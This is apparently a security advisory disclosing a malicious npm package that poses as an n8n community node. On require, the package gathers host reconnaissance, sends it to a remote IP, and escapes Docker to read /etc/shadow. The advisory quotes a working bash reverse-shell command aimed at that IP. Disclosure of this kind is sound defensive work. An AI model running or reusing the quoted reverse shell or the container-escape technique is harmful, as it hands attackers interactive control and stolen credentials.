summary: n8n-nodes-task-runner exfiltrates host recon and opens reverse shell to 103.27.109.184 on require
details: The package's main entry `index.js` runs a top-level IIFE on every require that (1) executes `hostname`, `id`, `hostname -I`, `docker ps`, `getent group docker`, and `env`, packages the output as JSON, and sends it over TCP to 103.27.109.184:8890; (2) spawns `/bin/bash -c 'exec 3<>/dev/tcp/103.27.109.184/8895; bash -i <&3 >&3 2>&3'`, giving a remote party an interactive shell on the host; and (3) when Docker is available, runs `docker run --rm -v /:/host alpine...` to read the host `/etc/shadow` and attempts lateral movement against sibling containers, shipping the output to 103.27.109.184:8891. The package presents itself as an n8n community node (`n8n-nodes-task-runner`, keywords advertising utility nodes for n8n) and ships a benign-looking `MyNode.js` stub, but the `main` entry contains no n8n functionality — only the recon, reverse-shell, and Docker-escape payload. The cover-story name and keywords appear designed to attract n8n users.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
